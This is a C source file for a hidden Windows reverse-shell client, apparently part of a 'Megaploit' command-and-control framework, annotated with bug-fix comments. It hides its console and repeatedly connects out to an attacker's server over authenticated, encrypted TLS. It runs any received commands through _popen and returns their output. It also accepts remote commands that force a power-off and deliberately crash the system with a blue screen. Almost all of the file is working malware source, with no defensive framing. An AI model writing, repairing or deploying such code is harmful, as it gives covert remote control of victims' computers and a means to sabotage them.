/*
 * Source.c  –  C-remote-shell client
 *
 * Transport is fully secured through the advanced TLS layer:
 *
 *   1. SChannel TLS 1.2 / 1.3  (AEAD-only, no renegotiation, no compression)
 *   2. HMAC-SHA256 challenge/response authentication
 *   3. Protocol v2 negotiation  (0x4d magic byte echo)
 *   4. AES-256-GCM framed messages with replay protection
 *
 * All four layers are performed inside tls_connect() before any shell
 * traffic flows, mirroring the Megaploit C2 listener.py handshake sequence.
 */

#include "definitions.h"

typedef enum _SHUTDOWN_ACTION {
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;

ULONG    hardErrorResp_Receiver;
NTSTATUS (NTAPI *RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
NTSTATUS (NTAPI *NtShutdownSystem)(_In_ SHUTDOWN_ACTION);
/* BUG: original signature had (POWER_ACTION, BOOLEAN, BOOLEAN) which does not
 * match the NT kernel prototype.  Correct signature mirrors ntcalls.h:
 * (POWER_ACTION SystemAction, SYSTEM_POWER_STATE MinSystemState, ULONG Flags) */
NTSTATUS (NTAPI *NtSetSystemPowerState)(_In_ POWER_ACTION SystemAction,
                                         _In_ SYSTEM_POWER_STATE MinSystemState,
                                         _In_ ULONG Flags);
NTSTATUS (NTAPI *NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

/* Global TLS context shared between WinMain and init_shellDrop */
static TLS_CONTEXT g_tls;


/* ─────────────────────────────────────────────────────────────────────────── */
/*  NT call verification                                                       */
/*  FIX: was VOID but returned integer codes; was checking NT status backwards */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL checkNtCalls(VOID)
{
    if (!RtlAdjustPrivilege)   return FALSE;
    if (!NtShutdownSystem)     return FALSE;
    if (!NtSetSystemPowerState) return FALSE;
    if (!NtRaiseHardError)     return FALSE;

    /* Attempt to acquire SeShutdownPrivilege (privilege 19).
     * RtlAdjustPrivilege returns 0 (STATUS_SUCCESS) on success.            */
    BOOLEAN  prevState = FALSE;
    NTSTATUS ns = RtlAdjustPrivilege(19, TRUE, FALSE, &prevState);
    /* NT_SUCCESS: top bit clear = 0x0xxxxxxx or 0x4xxxxxxx (info/warning).
     * We treat failure as non-fatal — the other NT calls may still work.   */
    (void)ns;

    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Load the 32-byte binary secret key from disk                               */
/*  Matches megaploit.core.crypto.load_key():                                  */
/*    File contains 64 ASCII hex characters → hex-decoded to 32 raw bytes.     */
/*  Generate with:                                                              */
/*    python -c "import os,binascii;                                            */
/*        open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"     */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _load_secret_key(const char *pszPath, BYTE pKey[32])
{
    FILE *f = fopen(pszPath, "rb");
    if (!f) return FALSE;

    /* Read up to 68 bytes (64 hex chars + optional whitespace + NUL) */
    char hex[68] = {0};
    size_t n = fread(hex, 1, sizeof(hex) - 1, f);
    fclose(f);

    /* Strip trailing whitespace / newlines */
    while (n > 0 && (hex[n-1] == '\n' || hex[n-1] == '\r' ||
                      hex[n-1] == ' '  || hex[n-1] == '\t'))
        hex[--n] = '\0';

    /* Must be exactly 64 hex characters */
    if (n != 64) return FALSE;

    /* Hex-decode into pKey[32] */
    for (int i = 0; i < 32; i++) {
        char hi = hex[i * 2];
        char lo = hex[i * 2 + 1];

        BYTE h, l;
        if      (hi >= '0' && hi <= '9') h = (BYTE)(hi - '0');
        else if (hi >= 'a' && hi <= 'f') h = (BYTE)(hi - 'a' + 10);
        else if (hi >= 'A' && hi <= 'F') h = (BYTE)(hi - 'A' + 10);
        else return FALSE;

        if      (lo >= '0' && lo <= '9') l = (BYTE)(lo - '0');
        else if (lo >= 'a' && lo <= 'f') l = (BYTE)(lo - 'a' + 10);
        else if (lo >= 'A' && lo <= 'F') l = (BYTE)(lo - 'A' + 10);
        else return FALSE;

        pKey[i] = (BYTE)((h << 4) | l);
    }
    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Shell command loop                                                         */
/*  FIX: fclose → _pclose for _popen handles                                   */
/*  FIX: only send response when there is output (no empty frames)             */
/* ─────────────────────────────────────────────────────────────────────────── */

static INT init_shellDrop(VOID)
{
    BYTE  *pCmd      = NULL;
    DWORD  cbCmd     = 0;
    char   memContain[1024];
    char   cResp[18384];

    while (1) {
        /* Free the previous command buffer before blocking on the next recv */
        if (pCmd) { free(pCmd); pCmd = NULL; cbCmd = 0; }

        RtlZeroMemory(memContain, sizeof(memContain));
        RtlZeroMemory(cResp,      sizeof(cResp));

        /* Receive the next command (AES-256-GCM decrypted, seq-verified) */
        if (!tls_recv_msg(&g_tls, &pCmd, &cbCmd)) {
            break;  /* connection lost — fall back to reconnect loop */
        }

        /* ── "q" – clean disconnect ──────────────────────────────────── */
        /* FIX: cbCmd>=1 + strncmp(1) matches "quit", "queen", etc.
         * Require exact single-byte match.                               */
        if (cbCmd == 1 && ((char *)pCmd)[0] == 'q') {
            free(pCmd); pCmd = NULL;
            tls_disconnect(&g_tls);
            WSACleanup();
            return 0x00;
        }

        /* ── "forceOff()" – forced hardware power-off ────────────────── */
        if (cbCmd >= 10 && strncmp("forceOff()", (char *)pCmd, 10) == 0) {
            free(pCmd); pCmd = NULL;
            NtSetSystemPowerState(PowerActionShutdownOff,
                                  PowerSystemShutdown,
                                  SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY);
            NtShutdownSystem(ShutdownPowerOff);
            /* unreachable after shutdown; kept for compiler satisfaction */
            return 0x00;
        }

        /* ── "blueScreen()" – NtRaiseHardError BSOD ─────────────────── */
        if (cbCmd >= 12 && strncmp("blueScreen()", (char *)pCmd, 12) == 0) {
            free(pCmd); pCmd = NULL;
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL,
                             6, &hardErrorResp_Receiver);
            /* Only reachable if the call was somehow non-fatal */
            continue;
        }

        /* ── General shell command ───────────────────────────────────── */
        /* FIX: _popen handle must be closed with _pclose, not fclose     */
        FILE *pFile = _popen((char *)pCmd, "r");
        free(pCmd); pCmd = NULL;

        if (pFile) {
            while (fgets(memContain, sizeof(memContain), pFile) != NULL) {
                /* Overflow guard: leave room for the NUL terminator */
                size_t used = strlen(cResp);
                size_t add  = strlen(memContain);
                if (used + add < sizeof(cResp) - 1)
                    memcpy(cResp + used, memContain, add + 1);
            }
            _pclose(pFile);   /* FIX: was fclose — undefined behaviour on popen handle */
        }

        /* FIX: only transmit when there is actual output to send */
        size_t cbOut = strlen(cResp);
        if (cbOut > 0) {
            tls_send_msg(&g_tls, (const BYTE *)cResp, (DWORD)cbOut);
        } else {
            /* Send a single space so the server's recv_msg doesn't block forever */
            tls_send_msg(&g_tls, (const BYTE *)" ", 1);
        }
    }

    if (pCmd) free(pCmd);
    return 0x00;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  WinMain                                                                    */
/*  FIX: CreateMutexA used with L"..." wide literal → now narrow string        */
/*  FIX: WSAStartup MAKEWORD(2,0) → MAKEWORD(2,2)                              */
/* ─────────────────────────────────────────────────────────────────────────── */

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
                     LPCSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrev; (void)lpCmdLine; (void)nCmdShow;

    /* Mutex guard — prevent multiple instances.
     * FIX: was CreateMutexA(..., L"consoleShell") — wide literal in A-variant  */
    CreateMutexA(NULL, FALSE, "consoleShell");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    /* Load NT syscall pointers from ntdll */
    HMODULE hNTDLL = LoadLibraryW(L"ntdll.dll");
    if (!hNTDLL) return 0x02;

    RtlAdjustPrivilege    = (PVOID)GetProcAddress(hNTDLL, "RtlAdjustPrivilege");
    NtShutdownSystem      = (PVOID)GetProcAddress(hNTDLL, "NtShutdownSystem");
    NtSetSystemPowerState = (PVOID)GetProcAddress(hNTDLL, "NtSetSystemPowerState");
    NtRaiseHardError      = (PVOID)GetProcAddress(hNTDLL, "NtRaiseHardError");
    checkNtCalls();

    /* Hide the console window */
    AllocConsole();
    HWND hConsole = GetConsoleWindow();
    if (hConsole) ShowWindow(hConsole, SW_HIDE);

    /* Winsock init — FIX: was MAKEWORD(2,0); 2.2 is required for full API  */
    if (WSAStartup(MAKEWORD(2, 2), &wData) != 0) return 0x00;

    /* Load the 32-byte raw HMAC shared secret */
    BYTE secretKey[32];
    if (!_load_secret_key(SECRET_KEY_PATH, secretKey)) {
        WSACleanup();
        return 0x01;
    }

    /* ── Outer reconnect loop ──────────────────────────────────────────── */
    while (1) {
        SOCKET iSock = socket(AF_INET, SOCK_STREAM, 0);
        if (iSock == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY * 1000);
            continue;
        }

        memset(&socket_stdIn, 0, sizeof(socket_stdIn));
        socket_stdIn.sin_family = AF_INET;
        socket_stdIn.sin_port   = htons(sPort);
        /* BUG: inet_addr() is deprecated and returns INADDR_NONE on error.
         * Replace with InetPtonA() (ws2tcpip.h) which handles IPv4+IPv6.  */
        if (InetPtonA(AF_INET, sIP, &socket_stdIn.sin_addr) != 1) {
            closesocket(iSock);
            WSACleanup();
            return 0x04;
        }

        /* Retry TCP connect; recreate the socket each attempt so it is
         * never in an error state when we call connect() again.           */
        while (connect(iSock, (struct sockaddr *)&socket_stdIn,
                        sizeof(socket_stdIn)) != 0) {
            closesocket(iSock);
            Sleep(RECONNECT_DELAY * 1000);
            iSock = socket(AF_INET, SOCK_STREAM, 0);
            if (iSock == INVALID_SOCKET)
                Sleep(RECONNECT_DELAY * 1000);
        }
        if (iSock == INVALID_SOCKET) {
            Sleep(RECONNECT_DELAY * 1000);
            continue;
        }

        /* ── Advanced TLS handshake (all 4 security layers) ─────────── */
        ZeroMemory(&g_tls, sizeof(g_tls));
        if (!tls_connect(&g_tls, iSock, sIP, secretKey)) {
            closesocket(iSock);
            Sleep(RECONNECT_DELAY * 1000);
            continue;
        }

        /* ── Shell command loop ──────────────────────────────────────── */
        init_shellDrop();

        /* Clean up before next reconnect attempt */
        tls_disconnect(&g_tls);
        closesocket(iSock);
        Sleep(RECONNECT_DELAY * 1000);
    }

    /* Unreachable — keep as safety net */
    SecureZeroMemory(secretKey, sizeof(secretKey));
    WSACleanup();
    return 0x00;
}
